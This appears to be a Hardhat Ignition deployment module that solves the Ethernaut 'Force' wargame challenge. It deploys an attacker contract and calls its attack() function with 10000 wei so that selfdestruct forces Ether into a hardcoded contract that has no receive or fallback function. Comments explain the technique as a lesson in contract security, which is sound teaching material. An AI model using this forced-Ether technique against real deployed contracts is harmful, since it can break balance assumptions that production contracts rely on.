import { buildModule } from "@nomicfoundation/hardhat-ignition/modules";

/**
 * FORCE CHALLENGE - Hardhat Ignition Deployment Module
 * 
 * CHALLENGE OVERVIEW:
 * The "Force" challenge is from Ethernaut. The objective is to send Ether to a 
 * contract that has no `receive()` or `fallback()` functions (making it impossible 
 * to transfer Ether through normal means). This deployment module demonstrates the 
 * attack solution.
 * 
 * ATTACK STRATEGY:
 * 1. Deploy the SendEtherToForce contract with initial funds (10000 wei)
 * 2. Call the `attack()` function with the target victim contract address
 * 3. Inside attack(), use `selfdestruct()` to force transfer all Ether to the victim
 * 
 * WHY THIS WORKS:
 * - Normal `.call()` transfers respect the recipient's contract logic
 * - `selfdestruct()` is a special EVM operation that forces Ether transfer
 * - Even contracts without `receive()` cannot prevent selfdestruct transfers
 * 
 * SECURITY IMPLICATIONS:
 * This demonstrates that contracts cannot assume they will never receive Ether.
 * Even if a contract doesn't provide a way to receive or handle Ether, it can 
 * still be forced to receive funds through selfdestruct attacks.
 */

// The address of the victim "Force" contract that we're attacking
// (This contract has no receive() or fallback() to accept Ether normally)
const FORCE_TOKEN_ADDRESS = "0xC191759F2dd689cA6479f9f93Eed132e3bd49800";

export default buildModule("SendEtherToForceModule", (m) => {
  // Deploy the SendEtherToForce attack contract
  const force = m.contract("SendEtherToForce");

  // Execute the attack:
  // - Call attack() with the victim address
  // - Provide 10000 wei to send to the victim via selfdestruct
  m.call(force, "attack", [FORCE_TOKEN_ADDRESS], {
    value: 10000n,
  });

  return { force };
});


